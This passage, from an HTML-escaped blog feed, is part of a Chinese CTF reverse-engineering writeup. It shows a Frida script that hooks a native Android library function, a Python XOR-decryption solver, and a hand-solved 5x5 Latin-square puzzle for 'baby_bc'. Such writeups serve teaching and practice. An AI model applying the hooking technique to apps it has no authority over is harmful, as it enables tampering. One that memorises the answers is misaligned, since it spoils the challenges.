    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Exports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//函数类型
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;type:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Exports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//函数名称
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Exports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//函数地址
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;address:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Exports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
     &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
     &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;libnativebaseadd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;findBaseAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;libnative-lib.so&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
     &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sub_1088&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;libnativebaseadd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1088&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
     &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;Interceptor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;attach&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sub_1088&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;onEnter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sub_1088 argo-&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;hexdump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]));&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sub_1088 arg1-&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;hexdump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]));&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sub_1088 arg2-&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;onLeave&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;retval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
           &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ret-&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;hexdump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
   
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;hook&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后发现每三个为一组 互相xor,之后与“12345678”xor&lt;/p&gt;
&lt;p&gt;写出exp&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;input1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;123456789012345678901234567890123456789&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;xor1&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x8a\xc1\x0a\xe0\x3c\x87\xe9\x9f\xc9\x03\x3b\xfd\x95\x09\x3d\x93\x45\xa6\xa4\x79\xf8\x5a\x4e\x81\x6c\x2d\xe2\x8f\x60\x9d\xd2\x5c\x8a\xb3\x4f\x50\xa7\x39\x2e&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;xor2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;39&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;xor2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xor1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;input1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;12345678&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;result1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xA3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xE3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x69&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xBB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x84&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x65&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xC2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
  &lt;span class=&#34;mh&#34;&gt;0xAD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xAD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x9E&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x05&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x02&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8E&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x4F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
  &lt;span class=&#34;mh&#34;&gt;0xE1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xEB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xAF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xF0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xEA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xC4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xA8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2D&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x42&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xC7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
  &lt;span class=&#34;mh&#34;&gt;0x6E&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xB0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xD3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xCC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x78&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xF9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x98&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;byteorder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;result2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;39&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
   &lt;span class=&#34;n&#34;&gt;result2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;39&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;result2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;result2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;result2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;39&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;result2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xor2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;39&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;baby_bc&#34;&gt;baby_bc&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;clang baby.bc -o baby&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ida分析，5x5的矩阵，每行每列各不相同，只能填12345 里面被填了的地方写0 a  [3] [3]=4 a [4] [4] = 3, 还有一些 &amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;的约束条件 ，不会写算法，手撸&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;14253
53142
35421
21534
42315
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再替换0 1425353142350212150442315 md5就好了&lt;/p&gt;
&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;
&lt;p&gt;从来不做Misc&lt;/p&gt;
</description>
        </item>
        <item>
        <title>虎符CTF Writeup by X1cT34m</title>
